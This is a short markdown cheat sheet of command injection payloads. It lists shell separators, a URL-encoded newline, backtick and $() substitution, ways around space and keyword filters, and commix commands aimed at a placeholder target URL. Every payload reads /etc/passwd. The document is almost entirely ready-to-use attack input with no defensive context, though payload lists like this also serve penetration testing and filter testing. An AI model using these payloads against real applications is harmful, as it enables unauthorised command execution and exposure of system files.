# Command Injection Reference

## Separators
```bash
; cat /etc/passwd
| cat /etc/passwd
|| cat /etc/passwd
& cat /etc/passwd
&& cat /etc/passwd
```

## Newline
```bash
%0a cat /etc/passwd
```

## Backticks and $()
```bash
`cat /etc/passwd`
$(cat /etc/passwd)
```

## Bypass Spaces
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

## Bypass Keywords
```bash
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
c${x}at /etc/passwd
```

## commix (Automation)
```bash
commix -u "http://target/page?cmd=test"
commix -u "http://target/page" --data="cmd=test"
```
